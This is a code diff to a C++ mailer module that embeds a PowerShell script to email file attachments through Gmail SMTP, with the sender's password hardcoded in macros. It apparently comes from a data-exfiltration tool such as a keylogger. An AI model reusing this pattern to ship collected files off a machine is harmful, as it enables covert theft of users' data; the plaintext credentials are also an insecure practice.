@@ -9,9 +9,9 @@ using namespace std;
 
 namespace Mailer
 {
-#define MAIL_TO (string)"" //Fill in Recipient Mail Id
-#define MAIL_FROM (string)"" //Fill in Sender Mail Id
-#define MAIL_PASS (string)"" //Fill in Sender mail  Password
+#define MAIL_TO "" //Fill in Recipient Mail Id
+#define MAIL_FROM "" //Fill in Sender Mail Id
+#define MAIL_PASS "" //Fill in Sender mail  Password
 
     const string &PowerShellScript =
         "Param( \r\n   [String]$Attach_Main,\r\n   [String]$Subject_Main,\r\n   "
@@ -32,21 +32,21 @@ namespace Mailer
         "         $Message.Attachments.Add($attach)\r\n                            }\r\n                    "
         "}\r\n                catch\r\n                    {\r\n                        exit 2; "
         "\r\n                    }\r\n            }\r\n "
-        "           $client = New-Object Net.Mail.SmtpClient($Server, 587) #587 port for smtp.gmail.com SSL\r\n "
+        "           $client = New-Object System.Net.Mail.SmtpClient($Server, 587) #587 port for smtp.gmail.com SSL\r\n "
         "           $client.EnableSsl = $true \r\n            $client.Credentials = New-Object "
-        "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $client.Send($Message)\r\n "
+        "System.Net.NetworkCredential($From, $Password); \r\n            $client.Send($Message)\r\n "
         "           Remove-Variable -Name client\r\n            Remove-Variable -Name Password\r\n            "
         "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
         "  \r\n          }\r\n} #End Function Send-Mail\r\ntry\r\n    {\r\n        "
         "Send-Mail -Attachments $Attach_Main "
-        "-To \"" + MAIL_TO +
+        "-To \"" + (string)MAIL_TO +
         "\""
         " -Body $Body_Main -Subject $Subject_Main "
         "-Password \"" +
-        MAIL_PASS +
+        (string)MAIL_PASS +
         "\""
         " -From \"" +
-        MAIL_FROM +
+        (string)MAIL_FROM +
         "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 
 #undef MAIL_TO 
